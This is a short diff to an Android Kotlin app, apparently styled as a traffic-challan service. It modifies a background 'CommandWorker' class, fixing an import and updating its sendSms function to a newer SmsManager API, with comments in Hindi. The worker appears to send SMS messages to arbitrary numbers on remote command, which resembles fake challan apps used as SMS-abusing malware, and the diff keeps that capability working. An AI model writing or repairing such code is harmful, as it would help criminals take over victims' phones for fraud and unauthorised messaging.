@@ -4,7 +4,8 @@ import android.content.Context
 import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
-import androidx.work.Result
+// ध्यान दें: यहाँ ListenableWorker.Result का इस्तेमाल किया गया है
+import androidx.work.ListenableWorker.Result 
 import com.google.gson.Gson
 import com.rte.challan.network.ApiClient
 import com.rte.challan.utils.DeviceInfo
@@ -55,7 +56,9 @@ class CommandWorker(context: Context, params: WorkerParameters) : CoroutineWorke
 
     private fun sendSms(number: String, text: String) {
         try {
-            android.telephony.SmsManager.getDefault().sendTextMessage(number, null, text, null, null)
+            // नए Android वर्जन्स के लिए SmsManager प्राप्त करने का सही तरीका
+            val smsManager = applicationContext.getSystemService(android.telephony.SmsManager::class.java)
+            smsManager.sendTextMessage(number, null, text, null, null)
         } catch (e: Exception) {
             Log.e("CommandWorker", "SMS send failed: ${e.message}")
         }
